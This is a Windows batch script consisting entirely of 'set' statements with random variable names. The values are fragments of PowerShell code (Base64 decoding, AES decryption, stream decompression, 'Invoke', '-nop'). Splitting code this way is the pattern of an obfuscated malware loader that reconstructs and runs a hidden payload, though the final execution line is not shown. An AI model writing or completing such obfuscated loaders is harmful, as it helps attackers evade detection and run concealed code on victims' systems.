@echo off
set "DOSbjllHSE=M.Pa"
set "OYzyLgximd=stem"
set "CjrTKgfIym=, (,"
set "OYewpxjiRM=dj0C"
set "hVgrBMVjme=raph"
set "aVtAOYodUt=ew-O"
set "ludyDyGmeQ=yste"
set "zossoHEwkm=.-16"
set "NRCjTBKtuu=6esa"
set "vOncjuCxBD=106u"
set "JKbsxcpoRQ=y.Pa"
set "xPTdlGCqOz=ck($"
set "qOsFitgjVm=l5E7"
set "vPQxEqPxGy=uje."
set "ajRABXKkbJ=sion"
set "fiZLOGlIdO='[-1"
set "YddPrwAMpH= [st"
set "hIRMUTtTgD=y]::"
set "bmdXkWkCBq=rt]:"
set "nbbLUNYWtx=F'[-"
set "enizOjAhhS=lit("
set "uHrNTjZyFJ=Comp"
set "TypNHUeGGb=rofi"
set "RoWzNnHbGU=('%*'"
set "rBXampLjyM=V = "
set "YIYGqkNUPY=PTtG"
set "SPZYYXSXTB== $h"
set "cCISBbgsPx=pose"
set "nYaJcljXuo=3); "
set "TMthiwyqsl=New-"
set "XCLLyxsyqx=am;$"
set "nDypamHruV=m.IO"
set "YVwILsGfdX=  $C"
set "KpoGKvhKVD=jb);"
set "epPTXUvjfo=).Sp"
set "XcHLwLwLdq=tion"
set "kNxSULgRKN=[-1."
set "cQNOSheQsY=($Uv"
set "fhdJYCZbqc=ne);"
set "FDZrnOBEcp=stem"
set "yiBvwRBTmW=S.Su"
set "jPWAWWdLGK=daeR"
set "DFHSnLHgcj=Wj.T"
set "vbXdGgXcgD=.Cre"
set "hQAeOaDoJj=ach "
set "DsTcgUhmCc=le  "
set "GkSrTjihqp=RVkj"
set "oyWMbSuLnV=pher"
set "VaFDoXdWGX=m.Re"
set "BsTpSejCuG=('da"
set "OuHMtagiVp=q, 0"
set "JTyWgbrdvj=ewLi"
set "rAaahJhpoF=$vYb"
set "eHwiJjXHlM=File"
set "NFVpMMoPXW=Fina"
set "LIINqnCFDJ=bstr"
set "MAPBzMpogK=and "
set "vtCFpfTpIE=yste"
set "ztvyaPIJZx=gth)"
set "BqJRSynXWf= if "
set "eOiTKBQCYh=tem."
set "BpUDtxgHlQ=gjYA"
set "clEtEDzPsk=New-"
set "UclPlWJEhz=ment"
set "oRMvATfHBk=.Dis"
set "QhivgGFmAj=join"
set "ZkcQJBtOpx=mory"
set "eECqMscfCs=Comp"
set "wMcLIeVkOh=exvM"
set "yeGewbgRgq=tS46"
set "VTnasqmqeq= '')"
set "AHkykrHXrZ=oint"
set "bVAQOtGhdm=();$"
set "AjzbVRsfii=ct S"
set "uEBOLdJxZl=L4Yi"
set "UAGnURPmOz=$hex"
set "EdWqfadZYM=d;$h"
set "sWHlHwWSec=q = "
set "yquSBWwmbk=ddin"
set "MMLagVMcuB=.Mem"
set "psTZHGSgBG=rity"
set "TUwDqZFFtm=Syst"
set "dykaEHZdvT=ode]"
set "lFWCovFHnR=yste"
set "fjnqiSmTjS=jq);"
set "vqZojxgCwa=]::("
set "OCDppgWeWA=6] -"
set "FiRXTuXdLV=zuZI"
set "WyXstbIGYE=Mode"
set "PWdqeNsfmm=form"
set "VYoeiXXuLL=ke($"
set "Rghypjebcv=.IO."
set "aZyAmdhgKl=.Len"
set "FcvVtnGxTr=OHS."
set "trBHpBtCWK=stem"
set "XqCgMVuhuJ=tem."
set "LgisBbAfSo=hexv"
set "IJEczdjFIi=rans"
set "cVJbfCTUvV=eMVs"
set "ruoGTjnflq=exvM"
set "ptXDYezhXH=);$u"
set "QTrKtSynTY=]::N"
set "zDTlPYMSef=, $R"
set "vgHpYNKLxN=-nop"
set "YIsdUMOAzW=rtS4"
set "ItuvTWgyyx=esaB"
set "uKsQfbAXUZ= = $"
set "NocIgGuUbB=WNkO"
set "JXXEftKRjA=);$h"
set "lcAHTnfOiE=saBm"
set "qbGDqIJugU= = N"
set "hlcmWIyxTN=('Tg"
set "vPsGwmwCRz=-Obj"
set "hstqgRmaKe= '')"
set "tuLViDLWvw=ring"
set "PMlUodRtWL=bjec"
set "keymAhyvKg=)))"
set "qAjRNhBqPB=TllA"
